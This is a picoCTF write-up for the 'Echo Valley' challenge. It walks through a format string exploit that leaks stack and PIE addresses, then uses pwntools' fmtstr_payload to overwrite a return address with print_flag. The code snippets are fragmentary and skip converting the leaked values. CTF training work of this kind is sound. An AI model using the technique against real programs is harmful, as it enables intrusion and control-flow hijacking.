# Echo Valley

**Platform:** picoCTF  
**Technique:** Format String Exploitation + PIE Bypass  
**Difficulty:** Hard  

## Challenge Description

A format string vulnerability in a 64-bit binary with **all protections enabled**:
- Full RELRO
- Stack Canary
- NX
- PIE

The program runs in an infinite loop, allowing multiple format string payloads. The goal is to overwrite the return address on the stack with the address of `print_flag()`.

## Vulnerability

The program uses `printf(buffer)` directly in a loop, creating a format string vulnerability. Since it runs in a loop, we can send multiple payloads — first to leak addresses, then to overwrite the return address.

## Exploitation

### Step 1: Find the Leaks

After testing various positions, I found that:
- `%20$p` leaks a **stack address**
- `%21$p` leaks a **PIE address**

```python
p.sendline(b'%20$p %21$p')
p.recvuntil(b'distance: ')
stack, pie_leak = p.recvline().split()
```
Step 2: Calculate PIE Base
The PIE leak came from a known offset. After calculating:

```python
pie_base = pie_leak - 0x1413
io.address = pie_base
```
Now we have the base address of the binary, so we can access any function using its offset.

Step 3: Find the Return Address
The stack leak gave us a stack address. The return address we want to overwrite is located at stack - 8 (8 bytes below the leaked stack address on 64-bit systems).

Step 4: Build the Payload
Using fmtstr_payload with write_size='short' to write the print_flag address to the return address location:

```python
payload = fmtstr_payload(6, {stack-8: io.sym.print_flag}, write_size='short')
```
Offset 6 was found using the AAAA%p marker technique — the position where our input lands on the stack.

Step 5: Trigger
Send the payload, then send exit to break out of the loop and trigger the return:

```python
p.sendline(payload)
p.sendline('exit')
p.interactive()
```
